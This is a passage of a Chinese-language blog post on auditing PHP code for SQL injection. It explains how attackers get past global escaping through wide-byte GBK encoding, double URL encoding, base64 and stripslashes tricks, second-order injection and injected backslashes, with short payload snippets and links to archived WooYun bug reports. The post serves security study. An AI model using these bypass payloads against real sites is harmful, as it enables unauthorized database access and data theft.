+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">utf<span class="number">-8</span> -&gt; gbk</span><br><span class="line">iconv(<span class="string">'utf-8'</span>, <span class="string">'gbk'</span>,$id)</span><br><span class="line">%e5%<span class="number">5</span>c<span class="string">'====(addslashes)====&gt;e55c5c5c27====(iconv)====&gt;e98ca6\\'</span></span><br><span class="line"></span><br><span class="line">e98ca6\\<span class="string">'实际是錦\\'</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET NAMES gbk</span><br><span class="line">character_set_client=gbk</span><br><span class="line">mysql_set_charset(&apos;gbk&apos;)</span><br></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+</ul>
+</li>
+<li><p>编码解码</p>
+<ul>
+<li><p><code>urldecode</code></p>
+<ul>
+<li><p>当提交参数到webserver时，webserver会自动解码一次</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>%<span class="number">2527</span> ---&gt;webserver --&gt; id=<span class="number">1</span>%<span class="number">27</span> --&gt; urldecode--&gt; <span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><a href="http://localhost/1000php/bugs/wooyun-2014-053187.html" target="_blank" rel="noopener">http://localhost/1000php/bugs/wooyun-2014-053187.html</a></p>
+</li>
+</ul>
+</li>
+<li><p><code>rawurldecode</code></p>
+</li>
+<li><p><code>base64_decode</code></p>
+<ul>
+<li><a href="http://localhost/1000php/bugs/wooyun-2014-050338.html" target="_blank" rel="noopener">http://localhost/1000php/bugs/wooyun-2014-050338.html</a> 注入2</li>
+</ul>
+<p>​</p>
+</li>
+</ul>
+</li>
+<li><p>加密解密</p>
+<ul>
+<li>payload通过解密函数绕过了全局过滤函数，进入到sql语句中去了。</li>
+</ul>
+</li>
+<li><p>striplashes</p>
+<ul>
+<li><p>在全局addslashes后，在后面的文件中又使用stripslashes去掉了转义符，然后可以闭合单引号了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">' addslashes -&gt; a\`  stripslashes -&gt; a'</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><a href="http://localhost/1000php/bugs/wooyun-2015-0122057.html" target="_blank" rel="noopener">http://localhost/1000php/bugs/wooyun-2015-0122057.html</a></p>
+</li>
+</ul>
+<p>​</p>
+</li>
+</ul>
+<h3 id="二次攻击"><a href="#二次攻击" class="headerlink" title="二次攻击"></a>二次攻击</h3><ul>
+<li><p>数据库出来的变量没有进行过滤</p>
+<p><img src="1.png" alt=""></p>
+<ul>
+<li><p><a href="http://localhost/1000php/bugs/wooyun-2014-068362.html" target="_blank" rel="noopener">http://localhost/1000php/bugs/wooyun-2014-068362.html</a></p>
+</li>
+<li><p><a href="http://localhost/1000php/bugs/wooyun-2014-067424.html" target="_blank" rel="noopener">http://localhost/1000php/bugs/wooyun-2014-067424.html</a></p>
+</li>
+<li><p><a href="http://localhost/1000php/bugs/wooyun-2014-088872.html" target="_blank" rel="noopener">http://localhost/1000php/bugs/wooyun-2014-088872.html</a></p>
+<p>​</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="传入一个-两处可控输入"><a href="#传入一个-两处可控输入" class="headerlink" title="传入一个\(两处可控输入)"></a>传入一个<code>\</code>(两处可控输入)</h3><ul>
+<li><p>substr截断</p>
+   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$order_sn=substr($_GET[<span class="string">'order_sn'</span>], <span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//提交                 '</span></span><br><span class="line"><span class="comment">//魔术引号处理         \'</span></span><br><span class="line"><span class="comment">//substr               \</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><a href="http://localhost/1000php/bugs/wooyun-2014-088004.html" target="_blank" rel="noopener">http://localhost/1000php/bugs/wooyun-2014-088004.html</a></li>
+</ul>
+</li>
+<li><p>str_replace</p>
+<ul>
+<li><p>使用str_replace把<code>&#39;</code>给置空，在全局转义开启的情况下(gpc开启或者addslashes等过滤函数过滤时)，将<code>&#39;</code>变成了<code>\&#39;</code>，此时将<code>&#39;</code>置空，从而引入了<code>\</code></p>
+<ul>
+<li><a href="http://localhost/1000php/bugs/wooyun-2014-050636.html" target="_blank" rel="noopener">http://localhost/1000php/bugs/wooyun-2014-050636.html</a></li>
+</ul>
+</li>
+<li><p>str_replace用户可控</p>
+<ul>
+<li><a href="http://localhost/1000php/bugs/wooyun-2014-053198.html" target="_blank" rel="noopener">http://localhost/1000php/bugs/wooyun-2014-053198.html</a></li>
+</ul>
+<p>​</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="易被忽视："><a href="#易被忽视：" class="headerlink" title="易被忽视："></a>易被忽视：</h3><ul>
+<li>offset limit order by 后面的注入</li>
+<li>数组类型，全局防护只过滤了value，key未过滤带入了查询</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/14/记-SerialKillerBypassGadgetCollection-编译过程/" rel="prev" title="记 SerialKillerBypassGadgetCollection 编译过程">
+                记 SerialKillerBypassGadgetCollection 编译过程 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Badcode</p>
+              <p class="site-description motion-element" itemprop="description">学习经历</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是SQL注入漏洞"><span class="nav-number">2.</span> <span class="nav-text">什么是SQL注入漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#没有任何过滤的注入"><span class="nav-number">3.</span> <span class="nav-text">没有任何过滤的注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一些防护措施"><span class="nav-number">4.</span> <span class="nav-text">一些防护措施</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不受gpc影响的变量"><span class="nav-number">5.</span> <span class="nav-text">不受gpc影响的变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过全局过滤的几种情况"><span class="nav-number">6.</span> <span class="nav-text">绕过全局过滤的几种情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二次攻击"><span class="nav-number">7.</span> <span class="nav-text">二次攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#传入一个-两处可控输入"><span class="nav-number">8.</span> <span class="nav-text">传入一个\(两处可控输入)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#易被忽视："><span class="nav-number">9.</span> <span class="nav-text">易被忽视：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Badcode</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
